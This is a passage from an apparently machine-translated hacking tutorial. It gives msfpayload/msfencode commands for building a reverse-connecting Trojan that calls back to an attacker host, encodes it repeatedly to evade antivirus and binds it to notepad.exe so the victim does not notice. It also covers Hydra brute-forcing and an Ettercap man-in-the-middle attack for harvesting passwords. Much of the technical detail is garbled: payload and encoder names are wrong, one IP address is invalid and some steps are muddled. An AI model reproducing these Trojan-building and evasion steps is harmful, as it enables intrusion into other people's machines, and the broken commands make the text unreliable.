    software cannot recognize its original appearance, and the function of the program
    will not be affected. Similar to email attachments using Base64 re-encoding, the
    msf encoder recodes the original executable and generates a new binary. When this
    file is run, the msf encoder will decode the original program into memory and
    execute it.Use the command "msfencode -h" to view the msfencode parameter description,
    and "msfencode -l" to view the msf encoder list.kali root @ hacking : ~ # msfencode
    -l1\. Generate a Trojan file encoded with msfencode:msfpayload linux/exploit/reverse_udpLHOST=292.232.2.1
    LPORT=8454 R | msfencode -e x86/file -t exe > hacking/exploit.exeParameter explanation
    "R": Output raw data "|" : Separator "-e": Specify encoder type "-t": Output file
    type ">": Specify the generated file name (can be replaced with "-o" parameter)2)
    Multiple encodings a simple msfencode encoding is now difficult to bypass the
    soft kill, after mastering the basic coding techniques above, we learn about the
    multiple encoding of msfencode. In the Metasploit framework, we are allowed to
    use multiple encoding techniques to encode the attack payload (msfpayload) multiple
    times to bypass the soft signature check. Generate a Trojan file that has been
    encoded multiple times by msfencode:Parameter explanation "-c":Number of times
    of encoding using the current encoder "raw": Output "-o" with the original data
    type: Specify the generated file name.Note: The use of msfencode mixed code has
    been used many times, although it is better to bypass the soft detection, but
    it also has the possibility that the Trojan file will not work properly. Therefore,
    it is recommended to check the availability of the generated file after encoding.3\.
    Disguise your Trojan fileIn most cases, when the attacked user runs an executable
    file similar to the backdoor generated by us, because nothing happens, this is
    likely to cause user suspicion. In order to avoid being detected by the target,
    we can bundle a host program and start the camouflage effect while starting the
    attack payload. Here, the famous text editor notepad.exe (32-bit) program under
    Windows is used as the host program for demonstration. The notepad.exe file can
    be downloaded online or copied directly from the c:\windows\system32 path of the
    windows system.The Trojan file generated below will start the normal notepad text
    editor when it is opened by the attacker, and the backdoor program will execute
    in another independent process and connect back to the attacker. And has a certain
    ability to kill.msfpayload linux/exploit/reverse_udpLHOST=232.168.116.128 LPORT=14586
    R | msfencode -e x86/folder-c 5 -x penetration/exploit.exe -k -t exe -o penetration/exploitnotepad.exeThe
    parameter explains "-x": bind the Trojan to the program "-k": configure the attack
    payload to start in a separate threadNote that the "-k" parameter will configure
    the attack payload to be started in a separate thread so that the host program
    will not be affected during execution, but this parameter may not be used on all
    executables. Make sure you have it before the actual attack. Tested in an experimental
    environment.Auxillary modulesMetasploit''s auxiliary modules are mainly used in
    the information gathering phase. The functions include scanning, password guessing,
    sensitive information sniffing, FUZZ testing and exploiting vulnerabilities, and
    implementing network protocol spoofing. These modules can be divided into three
    major categories: Admin, Scanner, and Server.SYN Port Scanning Instance1\. After
    entering msfconsole, use the auxiliary syn scan module "use auxiliary/scanner/portscan/syn",
    then check the parameter status "show options", set the required parameters "set
    RHOSTS 192.232.2.1, 120, 221-224" and click" Run".Tips: Multi-IP parameter setting
    methods Nmap, Metasploit and other tools often encounter multiple ip settings,
    the syntax is: an ip segment, using "-" to indicate, such as 192.232.2.1 to 192.232.2.4
    can be expressed as "192.232.2.1 -4"; multiple discontinuous ips can be separated
    by ",", such as 192.232.2.5 and 192.232.2.7\. Two discontinuous ips can be represented
    by "192.232.2.4,6".Password AttacksThis section deals with a common thing hackers
    do i.e also known as cracking. Cracking is a process in which hackers with the
    help of tools authenticate into the system. Imagine a Facebook login page getting
    tons of requests from brute forcing tools like THC hydra, john the ripper. Password
    attack tools use different proxy servers to manipulate the intrusion detection
    systems.Below we go through the explanation of two famous password-cracking tools
    called THC hydra and John the ripper in detail.Online password attacksPassword
    complexityUpper and lower case letters, numbers, special characters, four choice
    length of more than 8-bit. Passwords of this complexity appear to be relatively
    secure, but for historical reasons, the mailbox system has opened access to the
    outside world, and there are a large number of companies that are bound to be
    a small number of employees who set up their passwords to look like very complex,
    but very common, regular passwords, which can easily be blown up, leading to the
    disclosure of sensitive company information.When the system must endure outside
    the network landing, out of the conscience of the industry, security will have
    to be tired of the regular use of password blasting tool active scanning, active
    detection of the user at risk. Burp suite can be used for web scanning purpose
    but it is not much effective due to various reasons. xHydra fills the gap with
    excellent customization commands that can help attack easily and effectively.xHydraHydra
    is a fairly powerful brute force password-cracking tool. The tool supports online
    password cracking for almost all protocols, such as File transfer protocol, HTTP,
    HTTPS, MySQL and cisco. Whether the password can be cracked, the key is whether
    the dictionary is powerful enough. Many users may be familiar with Hydra because
    the tool has a graphical interface and is very simple to operate, basically "fool"
    operation. The following uses the Hydra tool to crack online passwords.Use the
    Hydra tool to crack online passwords. The specific steps are as follows.(1) Start
    the Hydra attack. On the Kali desktop, select Applications and go into menu where
    you can see password-cracking tab. After clicking it, select the option online
    attack to get hydra-gtk command terminal.(2) This interface is used to set the
    address, port and protocol of the target system. To view the password attack process,
    check the Show Attempts checkbox in the Output Options box. Click the Passwords
    tab on this screen(3) Specify a username and password list file on this interface.
    In this example, the username and password list files that exist in the Kali system
    are used, and the Loop around user’s option is selected. The username and password
    files are stored in different places in the file system that you need to find.(4)
    After setting the password dictionary, click the Tuning tab(5) Set the task number
    and timeout time on this interface. If there are too many running tasks, the response
    rate of the service will drop. Therefore, it is recommended to change the original
    default task number 16 to 2 and the timeout time to 15\. Then check the check
    box of Exit after first found pair to indicate that the attack is stopped when
    the first pair of matches is found.(6) After all the above configurations are
    set, click the Start tab to attack,(7) Four buttons are displayed on this interface,
    which are start, stop, save output and clear output. Click the Start button here
    to start the attack.(8) The xHydra tool matches based on the entries in the custom
    username and password files. When a matching username and password are found,
    the attack is stopped.Password AnalysisBefore implementing password cracking,
    let me introduce how to analyze passwords. The purpose of analyzing passwords
    is to obtain a smaller password dictionary by collecting information from the
    target system and organization.Ettercap is a powerful spoofing tool for Linux,
    also for Windows. Users can quickly create fake packages using the Ettercap tool,
    enabling various levels of packages from network adapters to application software,
    binding monitoring data to a local port, and more. The use of the Ettercap tool
    is described below.The specific steps for analyzing passwords using Ettercap are
    as follows.(1) Configure Ettercap''s configuration file etter.conf. First use
    the locate command to find the location where the Ettercap configuration file
    is saved. Execute the command as follows:From the above output, you can see that
    the Ettercap configuration file etter.conf is stored in /etc/ettercap/.(2) Edit
    the etter.conf configuration file using VIM. Change the value of the ec_uid and
    ec_gid configuration items in the file to 0, and remove the comment from the IPTABLES
    line near the Linux part. The result of the modification is as follows:(3) After
    initiating the Ettercap tool Use the -G option in the terminal to launch the graphical
    interface. Execute the command as follows:(4) Collect various important information
    on the target system by using a man-in-the-middle attack. Use this information
    to build a possible password dictionary.Creating password dictionaries for the
    attackThe so-called password dictionary is mainly used in conjunction with password
    cracking software. The password dictionary includes many passwords that people
    habitually set. This can improve the password cracking success rate and hit rate
    of the password cracking software, and shorten the time of password cracking.
    Of course, if a person''s password settings are not regular or complex and are
    not included in the password dictionary, the dictionary is useless and may even
    extend the time required for password cracking. There are two tools in Crunch
    and rtgen in Linux that can be used to create password dictionaries. For the convenience
    of users, this section will introduce how to use these two tools.Crunch is a tool
    for creating password dictionaries that are commonly used for brute force attacks.
    Passwords generated using the Crunch tool can be sent to a terminal, file, or
    another program. The following describes how to create a password dictionary using
    the Crunch tool.Use Crunch to generate a dictionary. The specific steps are as
    follows.(1) Start the crunch command. The execution commands are as follows.root@kali:~#
    crunchAfter executing the above command, the following information will be output:Usage:
    crunch [options]The output information shows the version and syntax of the crunch
    command.'
